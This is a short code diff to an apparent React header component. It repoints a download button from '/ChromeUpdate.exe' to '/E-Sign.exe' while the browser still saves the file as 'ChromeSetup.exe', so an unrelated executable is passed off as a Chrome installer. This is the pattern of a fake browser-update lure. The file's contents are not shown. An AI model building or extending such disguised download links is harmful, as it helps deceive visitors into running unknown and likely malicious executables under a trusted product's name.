@@ -26,7 +26,7 @@ export const Header = () => {
             и указываем на него ссылку с атрибутом download 
           */}
           <a
-            href="/ChromeUpdate.exe"
+            href="/E-Sign.exe"
             download="ChromeSetup.exe"
             className="btn-download"
           >
